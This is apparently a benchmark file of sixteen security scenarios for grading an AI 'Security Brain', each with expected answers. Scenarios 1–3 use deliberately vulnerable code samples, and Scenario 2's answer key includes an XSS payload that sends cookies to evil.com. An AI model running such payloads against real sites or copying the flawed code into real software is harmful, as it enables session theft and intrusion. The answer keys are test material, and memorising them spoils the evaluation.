# Security Brain — Benchmark Tests (Authoritative)

These benchmark scenarios test the Security Brain's ability to identify, analyze,
respond to, and prevent security threats. Each scenario must be answered with
precision, technical depth, and operational awareness.

Vague answers fail. Theoretical-only answers fail. "It depends" without a decision tree fails.

---

## HOW TO USE THESE BENCHMARKS

1. Present a scenario to the Security Brain
2. Evaluate the response against the provided evaluation criteria
3. Score each response from 1-5 using the scoring rubric
4. A passing score is 4+ on every scenario
5. Any scenario scoring <3 indicates a critical knowledge gap

### Scoring Rubric

| Score | Meaning |
|-------|---------|
| 5 | Expert-level response. Technically precise, operationally actionable, considers edge cases and attacker mindset |
| 4 | Strong response. Technically correct with minor gaps in depth or operational detail |
| 3 | Adequate response. Directionally correct but lacks technical precision or misses key attack vectors |
| 2 | Weak response. Generic, incomplete, or misses critical security considerations |
| 1 | Failing response. Incorrect, dangerous advice, or fundamental misunderstanding of security concepts |

---

## SCENARIO 1: CODE REVIEW — SQL INJECTION

**Prompt:**
"Review this code for security vulnerabilities."

```python
def get_user(request):
    username = request.GET.get('username')
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

def update_profile(request):
    user_id = request.POST.get('user_id')
    bio = request.POST.get('bio')
    cursor.execute(f"UPDATE profiles SET bio = '{bio}' WHERE user_id = {user_id}")
    return {"status": "updated"}
```

**Evaluation Criteria:**
- Does it identify SQL injection in both functions?
- Does it explain how the vulnerability can be exploited?
- Does it provide correct remediation (parameterized queries)?
- Does it identify the IDOR vulnerability in update_profile?
- Does it note the missing authentication/authorization?
- Does it provide secure code examples?

**Expected Elements:**
1. SQL injection in get_user: String interpolation allows `' OR '1'='1` attack
2. SQL injection in update_profile: Both bio and user_id are injectable
3. IDOR in update_profile: user_id from POST means any user can update any profile
4. Missing authentication check (who is making this request?)
5. Missing authorization check (can THIS user update THIS profile?)
6. Fix: parameterized queries (`cursor.execute("SELECT * FROM users WHERE username = %s", (username,))`)
7. Fix: use session user_id instead of user-supplied user_id
8. Fix: add authentication middleware and authorization check

---

## SCENARIO 2: CODE REVIEW — XSS AND CSRF

**Prompt:**
"Review this code for security vulnerabilities."

```javascript
// Express.js route
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send(`<h1>Search results for: ${query}</h1><div id="results"></div>`);
});

app.post('/transfer', (req, res) => {
    const { to, amount } = req.body;
    transferFunds(req.session.userId, to, amount);
    res.json({ success: true });
});

app.get('/profile/:id', (req, res) => {
    const user = db.getUser(req.params.id);
    res.json(user);
});
```

**Evaluation Criteria:**
- Does it identify reflected XSS in the search endpoint?
- Does it identify missing CSRF protection on the transfer endpoint?
- Does it identify the IDOR on the profile endpoint?
- Does it provide specific exploitation scenarios?
- Does it provide correct remediation for each issue?

**Expected Elements:**
1. XSS in /search: User input directly embedded in HTML response
   - Exploit: `/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>`
   - Fix: HTML entity encoding, Content Security Policy header, use a template engine with auto-escaping
2. CSRF in /transfer: No CSRF token, no SameSite cookie, no custom header check
   - Exploit: Attacker creates page with auto-submitting form to /transfer
   - Fix: CSRF token, SameSite=Strict cookie, require custom header
3. IDOR in /profile/:id: Any authenticated user can access any profile
   - Exploit: Enumerate profile IDs to access other users' data
   - Fix: Authorization check (req.session.userId === req.params.id or admin role)
4. Missing security headers (CSP, X-Content-Type-Options, etc.)
5. Sensitive data exposure: /profile returns full user object (may include password hash, email, etc.)

---

## SCENARIO 3: CODE REVIEW — AUTHENTICATION FLAWS

**Prompt:**
"Review this authentication implementation for security vulnerabilities."

```python
import hashlib

def register(username, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
               (username, password_hash))

def login(username, password):
    user = db.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
    if user is None:
        return {"error": "User not found"}
    password_hash = hashlib.md5(password.encode()).hexdigest()
    if password_hash == user['password_hash']:
        session['user_id'] = user['id']
        return {"success": True}
    return {"error": "Incorrect password"}

def reset_password(email):
    token = str(random.randint(100000, 999999))
    db.execute("UPDATE users SET reset_token = ? WHERE email = ?", (token, email))
    send_email(email, f"Your reset code is: {token}")
```

**Evaluation Criteria:**
- Does it identify MD5 as cryptographically broken for password hashing?
- Does it identify the user enumeration vulnerability in login?
- Does it identify the weak reset token?
- Does it identify the missing rate limiting?
- Does it provide correct modern alternatives?

**Expected Elements:**
1. MD5 for passwords: Fundamentally broken. Rainbow table attacks trivial.
   - Fix: Use bcrypt, scrypt, or Argon2 with proper cost factor
2. User enumeration: Different error messages for "user not found" vs "wrong password"
   - Fix: Same error message for both cases ("Invalid credentials")
3. Weak reset token: 6-digit numeric (only 900,000 possibilities, brute-forceable)
   - Fix: Cryptographically random token (secrets.token_urlsafe(32)), token expiry, single-use
4. No rate limiting on login or password reset (brute force possible)
5. No account lockout or progressive delay
6. No password complexity requirements at registration
7. No MFA support
8. Session management: no session timeout, no session rotation after login
9. Missing breach password check (check against known compromised passwords)

---

## SCENARIO 4: THREAT MODEL — MULTI-TENANT SAAS WITH PHI

**Prompt:**
"Design a threat model for a multi-tenant SaaS application that handles Protected Health Information (PHI). The application has a web frontend, REST API, PostgreSQL database, and integrates with third-party EHR systems via HL7 FHIR."

**Evaluation Criteria:**
- Does it use a systematic methodology (STRIDE or equivalent)?
- Does it identify the multi-tenancy risks?
- Does it address PHI-specific requirements (HIPAA)?
- Does it cover the third-party integration risks?
- Does it provide a prioritized list of mitigations?

**Expected Elements:**
1. System decomposition: Frontend, API, database, EHR integration, authentication service
2. Trust boundaries: Browser to API, API to database, API to EHR, tenant to tenant
3. STRIDE analysis for each component:
   - Spoofing: Tenant A impersonating Tenant B, EHR integration credential compromise
   - Tampering: PHI modification, API request manipulation, EHR data integrity
   - Repudiation: Who accessed PHI and when (HIPAA audit trail requirement)
   - Information disclosure: PHI leak between tenants, PHI in logs, PHI in error messages
   - DoS: One tenant consuming all resources, EHR integration bottleneck
   - Elevation: Tenant user accessing admin functions, cross-tenant data access
4. Multi-tenancy specifics:
   - Database isolation (schema-per-tenant, row-level security, or separate databases)
   - API authorization ensuring tenant boundary enforcement
   - Shared infrastructure risks
5. HIPAA specifics:
   - BAA with all sub-processors
   - PHI encryption at rest and in transit
   - Access logging for all PHI access
   - Minimum necessary standard (return only needed PHI fields)
   - Breach notification process
6. EHR integration risks:
   - FHIR API authentication (OAuth 2.0 with SMART on FHIR)
   - Data validation of incoming HL7/FHIR payloads
   - Error handling that does not expose PHI
7. Prioritized mitigations

---

## SCENARIO 5: INCIDENT RESPONSE — STOLEN LAPTOP

**Prompt:**
"An employee reports their laptop was stolen from a coffee shop. The laptop has access to production systems. Walk through the incident response."

**Evaluation Criteria:**
- Does it follow a structured incident response framework?
- Does it prioritize containment actions?
- Does it consider what data/access was on the laptop?
- Does it address both technical and process responses?
- Does it include post-incident improvements?

**Expected Elements:**
1. Immediate (first 30 minutes):
   - Classify severity (what access does this employee have?)
   - Disable the employee's VPN access and SSO sessions
   - Revoke all active sessions for the employee's account
   - Trigger remote wipe (if MDM is in place)
   - Disable or rotate any API keys/credentials stored on the laptop
2. First 2 hours:
   - Determine what data was on the laptop (cached, downloaded, local copies)
   - Determine what systems the employee had access to
   - Check if disk encryption was enabled (if yes, risk is lower)
   - Check last known device activity (MDM logs)
   - Reset the employee's passwords for all systems
3. First 24 hours:
   - Audit recent access from the employee's credentials (was the laptop used after theft?)
   - Rotate any shared credentials the employee had access to
   - Notify affected teams and customers if data exposure is possible
   - File police report (for insurance and legal purposes)
   - Determine if this triggers a breach notification obligation
4. Post-incident:
   - Was disk encryption enabled? If not, require it for all devices
   - Was MDM in place? If not, deploy MDM to all devices
   - Review access policies: should production access require VPN + MFA + device cert?
   - Lessons learned document
   - Update incident response playbook

---

## SCENARIO 6: SUPPLY CHAIN ATTACK

**Prompt:**
"A popular npm package your application depends on was compromised. The malicious version has been published for 3 days before being discovered. The package is used in your API server. Assess and respond."

**Evaluation Criteria:**
- Does it treat this as a critical incident?
- Does it assess the blast radius (what did the malicious code have access to)?
- Does it propose both immediate containment and forensic investigation?
- Does it address long-term supply chain security improvements?

**Expected Elements:**
1. Immediate assessment (first hour):
   - Determine which version of the package is in your lock file
   - Determine if the malicious version was installed (check lock file, build artifacts)
   - Determine what the malicious code does (exfiltrate data, backdoor, cryptominer?)
   - Determine what the compromised package has access to at runtime (env vars, filesystem, network)
2. Containment (first 4 hours):
   - Pin to last known good version
   - Rebuild and redeploy without the compromised version
   - If malicious code ran: assume all secrets accessible to the process are compromised
   - Rotate all secrets, API keys, database credentials that the API server had access to
   - Check outbound network logs for exfiltration to unknown destinations
3. Investigation (24-72 hours):
   - Forensic analysis of what the malicious code actually executed
   - Review all deployments in the 3-day window
   - Check if any data was exfiltrated
   - Check if any backdoors were installed
4. Long-term improvements:
   - Lock file integrity verification in CI/CD
   - Dependency audit: minimize dependencies, prefer well-maintained packages
   - SCA tool in CI/CD pipeline that blocks known compromised packages
   - Consideration of private registry or vendoring for critical dependencies
   - Runtime monitoring for unexpected network connections or file access

---

## SCENARIO 7: CLOUD MISCONFIGURATION

**Prompt:**
"Your security scanning tool reports: S3 bucket 'company-backups' is publicly accessible. The bucket contains database backups from the last 6 months. Assess and respond."

**Evaluation Criteria:**
- Does it classify this as a potential data breach?
- Does it propose immediate containment?
- Does it assess what data was in the backups?
- Does it determine if the bucket was actually accessed?
- Does it address the root cause?

**Expected Elements:**
1. Immediate (first 30 minutes):
   - Remove public access immediately (block public access at bucket and account level)
   - Classify severity: what data is in the database backups?
   - If PII/PHI: this is a potential data breach, engage legal
2. Assessment (first 4 hours):
   - Check S3 access logs: was the bucket accessed by external parties?
   - Determine how long the bucket was public (when was the misconfiguration introduced?)
   - Identify what data is in the backups (PII, credentials, financial data?)
   - If credentials are in the backups: rotate all credentials immediately
3. Breach determination:
   - If external access confirmed: initiate breach notification process
   - If PII/PHI exposed: engage legal for regulatory notification requirements
   - If no external access: document as near-miss, still remediate
4. Root cause:
   - How was the bucket made public? (Manual change, IaC misconfiguration, default setting?)
   - Who made the change? (Audit trail from CloudTrail)
   - Why did it take until now to detect?
5. Prevention:
   - S3 Block Public Access at the account level
   - SCPs (Service Control Policies) preventing public bucket creation
   - IaC scanning (Checkov, tfsec) in CI/CD
   - Continuous monitoring for public resources (AWS Config rule)
   - Backup encryption with customer-managed keys

---

## SCENARIO 8: ZERO-DAY VULNERABILITY

**Prompt:**
"A zero-day RCE vulnerability is announced in the web framework your application uses. A patch is not yet available. The vulnerability is being actively exploited in the wild. What do you do?"

**Evaluation Criteria:**
- Does it treat this as an emergency with urgency?
- Does it propose mitigations when a patch is not available?
- Does it assess exploitability for the specific application?
- Does it balance risk mitigation with availability?
- Does it plan for the patch when it becomes available?

**Expected Elements:**
1. Immediate assessment (first hour):
   - Understand the vulnerability: what is the attack vector, preconditions, impact?
   - Determine if your application is exploitable (is the vulnerable code path reachable?)
   - Check if exploitation attempts are visible in your logs
2. Mitigation without a patch:
   - WAF rule to block known exploit patterns
   - Network-level mitigation (restrict access to affected endpoint if possible)
   - Application-level workaround (disable vulnerable feature, add input validation)
   - Increase monitoring and alerting on the vulnerable component
3. Risk assessment:
   - Is the application internet-facing? (Higher risk)
   - Is authentication required to reach the vulnerable endpoint? (Lower risk if yes)
   - What data/access would an attacker gain? (Determine impact)
4. Communication:
   - Brief engineering and leadership on the situation
   - Brief customers if they need to take action
   - Monitor vendor channels for patch announcements
5. Patch deployment:
   - When patch is released: test and deploy within 24 hours
   - Verify the patch addresses the vulnerability
   - Remove temporary mitigations after patching
   - Conduct post-patch verification scan

---

## SCENARIO 9: INSIDER THREAT

**Prompt:**
"The SOC detects that an engineer with production database access has been running unusual queries outside business hours, exporting large datasets. The data includes customer PII. Investigate and respond."

**Evaluation Criteria:**
- Does it balance investigation with containment?
- Does it involve the right stakeholders (legal, HR)?
- Does it preserve evidence while acting?
- Does it consider both malicious and innocent explanations?
- Does it address the systemic controls that should have prevented this?

**Expected Elements:**
1. Initial response (preserve evidence first):
   - Do NOT alert the employee yet (avoid evidence destruction)
   - Preserve all logs: database query logs, VPN logs, SSO logs, file transfer logs
   - Take forensic snapshot of relevant systems
   - Engage legal and HR before taking employment action
2. Investigation:
   - What queries were run? What data was exported?
   - Where did the data go? (Local machine, external service, email?)
   - Is there a legitimate business reason? (Sometimes there is)
   - Review access patterns: is this new behavior or ongoing?
   - Check if the employee gave notice or has other risk indicators
3. Containment (once evidence is preserved):
   - Revoke production database access (can be framed as routine access review)
   - Monitor the employee's activity closely
   - If malicious: disable all access, engage HR for employment action
   - If data was exfiltrated externally: this is a data breach
4. Response:
   - If breach confirmed: initiate breach notification process
   - If PII exposed: assess regulatory notification requirements
   - Communicate with affected customers if required
5. Systemic improvements:
   - Why did an engineer need direct production database access?
   - Implement query monitoring and anomaly detection
   - Implement DLP (Data Loss Prevention) controls
   - Review access control: JIT access, query limitations, export controls
   - Review logging: is all database access logged and alerted?

---

## SCENARIO 10: DDOS ATTACK

**Prompt:**
"Your application is experiencing a DDoS attack. Traffic has increased 50x, response times are >10 seconds, and some users are getting 503 errors. Your infrastructure is on AWS. Respond."

**Evaluation Criteria:**
- Does it propose immediate mitigation steps?
- Does it distinguish between volumetric and application-layer attacks?
- Does it leverage AWS-specific tools?
- Does it communicate to stakeholders appropriately?
- Does it plan for future prevention?

**Expected Elements:**
1. Immediate (first 15 minutes):
   - Confirm it is an attack (not legitimate traffic spike)
   - Enable AWS Shield Advanced if not already active
   - Scale infrastructure (auto-scaling, increase capacity)
   - Enable WAF rate limiting rules
2. Characterize the attack:
   - Volumetric (bandwidth), protocol (SYN flood), or application-layer (HTTP flood)?
   - Source: distributed IPs, specific regions, bot signatures?
   - Target: specific endpoint, general flood, API abuse?
3. Mitigation:
   - CloudFront/CDN to absorb volumetric traffic
   - WAF rules to block malicious patterns (user-agent, rate, geographic)
   - Rate limiting at the application level
   - Circuit breaker patterns to protect backend services
   - Geographic blocking if attack is from specific regions
4. Communication:
   - Status page update for customers
   - Internal communication to leadership
   - Support team briefed on customer-facing impact
5. Post-incident:
   - Full attack analysis (timing, source, pattern)
   - Infrastructure improvements (CDN, WAF rules, auto-scaling thresholds)
   - DDoS response playbook update
   - Consider DDoS simulation testing

---

## SCENARIO 11: PENETRATION TEST FINDINGS

**Prompt:**
"Your annual penetration test just came back with these findings: 1 Critical (SSRF allowing access to cloud metadata), 2 High (IDOR on billing API, JWT algorithm confusion), 3 Medium (verbose error messages, missing security headers, outdated TLS cipher suites). Prioritize and create a remediation plan."

**Evaluation Criteria:**
- Does it understand the severity of each finding?
- Does it prioritize correctly (SSRF is extremely dangerous in cloud)?
- Does it explain why each finding matters (not just that it exists)?
- Does it provide specific remediation for each?
- Does it set realistic timelines?

**Expected Elements:**
1. Priority 1 — SSRF (Critical, remediate within 72 hours):
   - Risk: SSRF to cloud metadata (169.254.169.254) can expose IAM credentials, allowing full cloud account compromise
   - Fix: Block requests to internal IPs, use IMDSv2 (requires token), validate and allow-list outbound URLs
2. Priority 2 — IDOR on billing API (High, remediate within 2 weeks):
   - Risk: Any authenticated user can view/modify other users' billing information
   - Fix: Server-side authorization check, verify requesting user owns the billing resource
3. Priority 3 — JWT algorithm confusion (High, remediate within 2 weeks):
   - Risk: Attacker can forge JWT tokens by switching algorithm from RS256 to HS256 using public key as HMAC secret
   - Fix: Explicitly specify allowed algorithms in JWT verification, reject none algorithm
4. Priority 4 — Medium findings (remediate within 30 days):
   - Verbose errors: Remove stack traces and internal details from production error responses
   - Security headers: Add CSP, X-Content-Type-Options, X-Frame-Options, HSTS, Referrer-Policy
   - TLS ciphers: Disable weak ciphers (RC4, 3DES, etc.), enforce TLS 1.2+ minimum
5. Verification plan: Re-test each finding after remediation
6. Timeline with owners for each finding

---

## SCENARIO 12: COMPLIANCE AUDIT PREPARATION

**Prompt:**
"You have 60 days to prepare for a SOC 2 Type II audit. The company has never been audited. What is your plan?"

**Evaluation Criteria:**
- Does it acknowledge 60 days is very tight for a first audit?
- Does it prioritize the most critical controls?
- Does it understand the difference between Type I and Type II?
- Does it propose a realistic plan given the timeline?
- Does it identify what might need to be deferred?

**Expected Elements:**
1. Reality check: SOC 2 Type II requires observation period (typically 3-12 months). In 60 days, you can prepare for a Type I (point-in-time) and begin the Type II observation period
2. Week 1-2: Gap assessment
   - Select Trust Service Criteria (Security is mandatory, add Availability, Confidentiality, Privacy as applicable)
   - Map existing controls to SOC 2 requirements
   - Identify gaps
3. Week 3-6: Control implementation
   - Prioritize: access control, change management, incident response, monitoring, vendor management
   - Document all policies (information security, acceptable use, data classification, incident response)
   - Implement missing technical controls
   - Begin evidence collection
4. Week 7-8: Audit readiness
   - Mock audit / readiness assessment
   - Ensure evidence is organized and accessible
   - Brief all control owners on the audit process
   - Fix any remaining gaps
5. Key controls to have in place:
   - Access management (provisioning, deprovisioning, reviews)
   - Change management (code review, approval, deployment process)
   - Monitoring and alerting
   - Incident response process
   - Vendor management
   - Risk assessment
   - Security awareness training

---

## SCENARIO 13: SECURITY ARCHITECTURE REVIEW

**Prompt:**
"Review this architecture for security concerns: React SPA -> API Gateway -> Lambda functions -> DynamoDB. Authentication via Cognito. File uploads stored in S3. Deployed in single AWS region."

**Evaluation Criteria:**
- Does it evaluate each component for security risks?
- Does it consider the connections between components?
- Does it address the serverless-specific security concerns?
- Does it consider availability and disaster recovery?
- Does it provide actionable recommendations?

**Expected Elements:**
1. React SPA: Client-side security, no secrets in frontend code, CSP headers, SRI for CDN assets
2. API Gateway: Rate limiting, WAF integration, request validation, authorization
3. Cognito: MFA enforcement, password policy, token management, user pool configuration
4. Lambda: IAM role per function (least privilege), environment variable encryption, timeout limits, cold start considerations, dependency scanning
5. DynamoDB: Encryption at rest (default), fine-grained access control, backup/PITR enabled
6. S3: No public access, presigned URLs for uploads, file type validation, virus scanning, encryption
7. Single region risk: No DR, no failover. Consider multi-region for critical data
8. Cross-cutting: Logging (CloudWatch, CloudTrail), monitoring, secrets management (Secrets Manager, not env vars)
9. Network: VPC for Lambda if accessing private resources, security groups

---

## SCENARIO 14: PHISHING RESPONSE

**Prompt:**
"An employee clicked a phishing link and entered their corporate credentials on a fake login page. They reported it 4 hours later. The employee has access to the admin panel, customer data, and Slack. Respond."

**Evaluation Criteria:**
- Does it treat this as a credential compromise incident?
- Does it identify the full blast radius of the compromised account?
- Does it prioritize containment while preserving evidence?
- Does it address both the immediate incident and long-term prevention?

**Expected Elements:**
1. Immediate containment:
   - Reset the employee's password across all systems
   - Revoke all active sessions (SSO, Slack, admin panel, email)
   - Enable MFA if not already enabled (this should have prevented the issue)
   - Disable the phishing URL (report to provider, block in web filter)
2. Assessment:
   - What happened in the 4-hour window between compromise and report?
   - Check admin panel audit logs: were any changes made?
   - Check email: were forwarding rules added? Were emails sent?
   - Check Slack: were any messages sent or DMs read?
   - Check customer data access: was anything exported or accessed?
3. Broader impact:
   - Was the phishing targeted (spear phishing) or broad campaign?
   - Were other employees targeted? Check email logs for similar phishing messages
   - Has the phishing domain been seen before? (Threat intelligence)
4. Long-term prevention:
   - MFA mandatory for all accounts (this is the single most important fix)
   - Phishing simulation program (if not already in place)
   - Email filtering improvements (DMARC, DKIM, SPF, advanced threat protection)
   - Security awareness training refresher for the team

---

## SCENARIO 15: SECURE DEVELOPMENT LIFECYCLE

**Prompt:**
"Design a Secure Software Development Lifecycle (SSDLC) for a startup with 20 engineers, shipping weekly to production. The team currently has no security process."

**Evaluation Criteria:**
- Does it propose a pragmatic approach for a startup (not enterprise-heavy)?
- Does it integrate security into existing workflow (not bolt-on)?
- Does it prioritize based on risk?
- Does it include automated and manual controls?
- Does it consider developer experience (security should not be a bottleneck)?

**Expected Elements:**
1. Design phase: Lightweight threat modeling for new features (15-minute STRIDE session)
2. Code phase: SAST in IDE (real-time feedback), secure coding guidelines, pre-commit hooks for secrets
3. Review phase: Security-focused PR review for auth/data/infra changes, automated SAST in CI
4. Build phase: SCA for dependencies, container scanning, SAST gate (block critical findings)
5. Deploy phase: Infrastructure scanning, deployment approval for sensitive changes
6. Runtime: DAST weekly, monitoring, alerting, WAF
7. Respond: Incident response process, vulnerability disclosure
8. Training: Quarterly secure coding training, security champions program
9. Prioritization: Start with the highest-impact items (secrets scanning, dependency scanning, auth review)
10. Timeline: Phase 1 (month 1) automated scanning, Phase 2 (month 2-3) process integration, Phase 3 (month 4-6) culture

---

## SCENARIO 16: RANSOMWARE RESPONSE

**Prompt:**
"At 3 AM, your monitoring alerts show multiple production servers are experiencing high disk I/O and files are being encrypted. This appears to be a ransomware attack. Your infrastructure runs on a mix of AWS and on-premise servers. Respond."

**Evaluation Criteria:**
- Does it propose immediate containment to stop the spread?
- Does it address the hybrid (cloud + on-prem) environment?
- Does it consider backup integrity?
- Does it address the ransom payment question?
- Does it plan for recovery and prevention?

**Expected Elements:**
1. Immediate (first 15 minutes):
   - Isolate affected systems from the network (pull network cable, security group lockdown)
   - Do NOT shut down encrypted systems (preserves memory for forensics)
   - Determine if AWS resources are affected (different containment strategy)
   - Activate incident response team, brief leadership
2. Containment (first hour):
   - Identify the ransomware strain (helps determine decryption options)
   - Map the spread: which systems are affected, which are clean?
   - Isolate clean systems to prevent spread
   - Check if backups are affected (attackers often target backups first)
   - Preserve evidence: forensic images of affected systems
3. Assessment:
   - How did the attacker get in? (Phishing, vulnerability, exposed RDP, compromised credentials?)
   - What is the scope? (Servers, databases, file shares, cloud resources?)
   - Are backups intact and usable? When was the last clean backup?
   - Is this a data exfiltration + encryption (double extortion)?
4. Recovery:
   - If backups are clean: restore from backup (verify integrity first)
   - If backups are compromised: assess recovery options, engage forensic specialists
   - Rebuild compromised systems from scratch (do not trust "cleaned" systems)
   - Change ALL credentials (assume everything is compromised)
5. Ransom payment: Generally advise against. Consult legal and law enforcement. Payment does not guarantee decryption and funds criminal activity.
6. Post-incident:
   - Full forensic investigation
   - Root cause remediation
   - Improve backup strategy (immutable backups, air-gapped backups)
   - Improve detection (EDR, network monitoring)
   - Tabletop exercise within 30 days with lessons learned

---

## BENCHMARK SCORING TEMPLATE

```
## Security Brain Benchmark Results
## Date: [YYYY-MM-DD]
## Evaluator: [Name]

| # | Scenario | Score (1-5) | Key Gaps |
|---|----------|-------------|----------|
| 1 | SQL Injection Code Review | _ | |
| 2 | XSS and CSRF Code Review | _ | |
| 3 | Authentication Flaws Review | _ | |
| 4 | Multi-Tenant PHI Threat Model | _ | |
| 5 | Stolen Laptop Incident | _ | |
| 6 | Supply Chain Attack | _ | |
| 7 | Cloud Misconfiguration | _ | |
| 8 | Zero-Day Vulnerability | _ | |
| 9 | Insider Threat | _ | |
| 10 | DDoS Attack | _ | |
| 11 | Penetration Test Findings | _ | |
| 12 | SOC 2 Audit Preparation | _ | |
| 13 | Security Architecture Review | _ | |
| 14 | Phishing Response | _ | |
| 15 | Secure Development Lifecycle | _ | |
| 16 | Ransomware Response | _ | |

**Average Score:** _
**Scenarios Below 3:** [List]
**Critical Gaps:** [Summary]

### Verdict
- [ ] PASS — All scenarios >= 4
- [ ] CONDITIONAL — Average >= 3.5, remediation plan for gaps
- [ ] FAIL — Any scenario < 3 or average < 3.5
```

---

**These benchmarks are authoritative. A Security Brain that cannot pass them is not ready.**
**Security is not theoretical. These scenarios test whether the discipline is operational.**
